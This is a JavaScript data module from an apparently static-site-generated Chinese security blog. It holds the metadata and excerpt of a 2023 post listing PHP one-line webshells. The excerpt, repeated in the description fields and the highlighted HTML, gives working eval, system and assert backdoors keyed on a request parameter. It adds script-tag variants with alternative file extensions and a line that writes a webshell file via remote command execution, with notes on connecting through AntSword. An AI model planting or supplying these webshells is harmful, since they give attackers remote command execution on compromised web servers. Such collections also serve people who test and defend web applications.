const n=JSON.parse(`{"key":"v-0f8a9889","path":"/WebSec/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E9%9B%86%E5%90%88.html","title":"一句话木马集合","lang":"zh-CN","frontmatter":{"title":"一句话木马集合","date":"2023-02-13T00:00:00.000Z","category":["Web安全"],"tag":["木马"],"description":"一句话木马集合 PHP 一句话木马 &lt;?php @eval($_REQUEST['tf']);?&gt; #蚂剑直连 &lt;?php system($_GET['tf']);?&gt;\\t//?tf=whoami &lt;?php assert(@$_REQUEST['tf']);?&gt;\\t//POST传参tf=system('whoami')或GET传参?tf=phpinfo() &lt;?=eval($_REQUEST['tf']);?&gt; &lt;?=system($_REQUEST['tf']);?&gt; &lt;script language=\\"php\\"&gt;eval($_POST['tf']);&lt;/script&gt; 后缀phtml，php3，pht，phps &lt;script language=php&gt;system(\\"whoami\\")&lt;/script&gt; fputs(fopen('shell1.php','w'),'&lt;?=@eval($_POST[\\"tf\\"]);?&gt;')\\t//配置远程命令执行写入一句话木马","head":[["meta",{"property":"og:url","content":"https://hzyxy.github.io/WebSec/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E9%9B%86%E5%90%88.html"}],["meta",{"property":"og:site_name","content":"XY"}],["meta",{"property":"og:title","content":"一句话木马集合"}],["meta",{"property":"og:description","content":"一句话木马集合 PHP 一句话木马 &lt;?php @eval($_REQUEST['tf']);?&gt; #蚂剑直连 &lt;?php system($_GET['tf']);?&gt;\\t//?tf=whoami &lt;?php assert(@$_REQUEST['tf']);?&gt;\\t//POST传参tf=system('whoami')或GET传参?tf=phpinfo() &lt;?=eval($_REQUEST['tf']);?&gt; &lt;?=system($_REQUEST['tf']);?&gt; &lt;script language=\\"php\\"&gt;eval($_POST['tf']);&lt;/script&gt; 后缀phtml，php3，pht，phps &lt;script language=php&gt;system(\\"whoami\\")&lt;/script&gt; fputs(fopen('shell1.php','w'),'&lt;?=@eval($_POST[\\"tf\\"]);?&gt;')\\t//配置远程命令执行写入一句话木马"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"XY"}],["meta",{"property":"article:tag","content":"木马"}],["meta",{"property":"article:published_time","content":"2023-02-13T00:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"一句话木马集合\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-02-13T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"XY\\",\\"url\\":\\"https://hzyxy.github.io\\"}]}"]]},"headers":[{"level":2,"title":"一句话木马集合","slug":"一句话木马集合","link":"#一句话木马集合","children":[{"level":3,"title":"PHP","slug":"php","link":"#php","children":[]},{"level":3,"title":"常见的危险函数","slug":"常见的危险函数","link":"#常见的危险函数","children":[]}]}],"git":{},"readingTime":{"minutes":1.22,"words":365},"filePathRelative":"WebSec/一句话木马集合.md","localizedDate":"2023年2月13日","excerpt":"<h2> 一句话木马集合</h2>\\n<h3> PHP</h3>\\n<h4> 一句话木马</h4>\\n<div class=\\"language-php line-numbers-mode\\" data-ext=\\"php\\"><pre class=\\"language-php\\"><code><span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?php</span> @<span class=\\"token keyword\\">eval</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$_REQUEST</span><span class=\\"token punctuation\\">[</span><span class=\\"token string single-quoted-string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span> #蚂剑直连\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?php</span> <span class=\\"token function\\">system</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$_GET</span><span class=\\"token punctuation\\">[</span><span class=\\"token string single-quoted-string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span>\\t//?tf=whoami\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?php</span> <span class=\\"token function\\">assert</span><span class=\\"token punctuation\\">(</span>@<span class=\\"token variable\\">$_REQUEST</span><span class=\\"token punctuation\\">[</span><span class=\\"token string single-quoted-string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span>\\t//POST传参tf=system('whoami')或GET传参?tf=phpinfo()\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?=</span><span class=\\"token keyword\\">eval</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$_REQUEST</span><span class=\\"token punctuation\\">[</span><span class=\\"token string single-quoted-string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span>\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?=</span><span class=\\"token function\\">system</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$_REQUEST</span><span class=\\"token punctuation\\">[</span><span class=\\"token string single-quoted-string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span>\\n<span class=\\"token tag\\"><span class=\\"token tag\\"><span class=\\"token punctuation\\">&lt;</span>script</span> <span class=\\"token attr-name\\">language</span><span class=\\"token attr-value\\"><span class=\\"token punctuation attr-equals\\">=</span><span class=\\"token punctuation\\">\\"</span>php<span class=\\"token punctuation\\">\\"</span></span><span class=\\"token punctuation\\">&gt;</span></span><span class=\\"token script\\"><span class=\\"token language-javascript\\"><span class=\\"token function\\">eval</span><span class=\\"token punctuation\\">(</span>$_POST<span class=\\"token punctuation\\">[</span><span class=\\"token string\\">'tf'</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span></span></span><span class=\\"token tag\\"><span class=\\"token tag\\"><span class=\\"token punctuation\\">&lt;/</span>script</span><span class=\\"token punctuation\\">&gt;</span></span> 后缀phtml，php3，pht，phps\\n<span class=\\"token tag\\"><span class=\\"token tag\\"><span class=\\"token punctuation\\">&lt;</span>script</span> <span class=\\"token attr-name\\">language</span><span class=\\"token attr-value\\"><span class=\\"token punctuation attr-equals\\">=</span>php</span><span class=\\"token punctuation\\">&gt;</span></span><span class=\\"token script\\"><span class=\\"token language-javascript\\"><span class=\\"token function\\">system</span><span class=\\"token punctuation\\">(</span><span class=\\"token string\\">\\"whoami\\"</span><span class=\\"token punctuation\\">)</span></span></span><span class=\\"token tag\\"><span class=\\"token tag\\"><span class=\\"token punctuation\\">&lt;/</span>script</span><span class=\\"token punctuation\\">&gt;</span></span>\\nfputs(fopen('shell1.php','w'),'<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?=</span>@<span class=\\"token keyword\\">eval</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$_POST</span><span class=\\"token punctuation\\">[</span><span class=\\"token string double-quoted-string\\">\\"tf\\"</span><span class=\\"token punctuation\\">]</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span><span class=\\"token delimiter important\\">?&gt;</span></span>')\\t//配置远程命令执行写入一句话木马\\n</code></pre><div class=\\"line-numbers\\" aria-hidden=\\"true\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}`);export{n as data};
